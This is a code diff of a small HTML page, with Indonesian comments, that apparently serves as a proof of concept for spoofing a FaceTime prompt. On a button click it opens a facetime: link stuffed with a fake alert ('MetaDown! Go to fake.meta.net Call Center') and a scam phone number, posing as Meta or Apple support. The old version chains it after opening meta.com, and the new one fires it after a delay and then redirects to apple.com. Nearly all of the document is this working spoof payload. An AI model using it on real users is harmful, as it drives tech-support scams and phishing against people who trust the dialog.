@@ -1,19 +1,23 @@
-<html> <body> <script> function cc(){ window.open("https://meta.com/"); }
-function bb(){
-var link = document.createElement('a');
-link.href = 'facetime:support.apple.com says:%0a%0dMetaDown!%0aGo%20to%20fake.meta.net%20Call%20Center%0a%0dCall:0987-65432';
-link.click();
-document.body.appendChild(link);
-}
+<!DOCTYPE html>
+<html>
+  <body>
+    <!-- Button yang memicu fungsi bb() saat diklik -->
+    <button onclick="bb()">Click Here</button>
 
-function aa()
-{
-setTimeout('cc()','0');
-setTimeout('bb()','500');
+    <script>
+      function bb() {
+        // Membuat elemen link untuk FaceTime
+        var link = document.createElement('a');
+        link.href = 'facetime:meta.com says:%0a%0dMetaDown!%0aGo%20to%20fake.meta.net%20Call%20Center%0a%0dCall:0987-65432';
+        
+        // Menunda eksekusi selama 5 detik sebelum mengeksekusi link.click()
+        setTimeout(function() {
+          link.click(); // Simulasikan klik untuk FaceTime (meskipun ini tidak akan berhasil karena format invalid)
 
-}
-</script>
-
-<button onclick="aa()">Click me</button>
-
-</body> </html>
+          // Redirect ke halaman lain setelah 5 detik
+          window.location = 'https://www.apple.com';  // Redirect ke halaman Apple setelah eksekusi
+        }, 5000); // Delay 5 detik (5000 ms)
+      }
+    </script>
+  </body>
+</html>
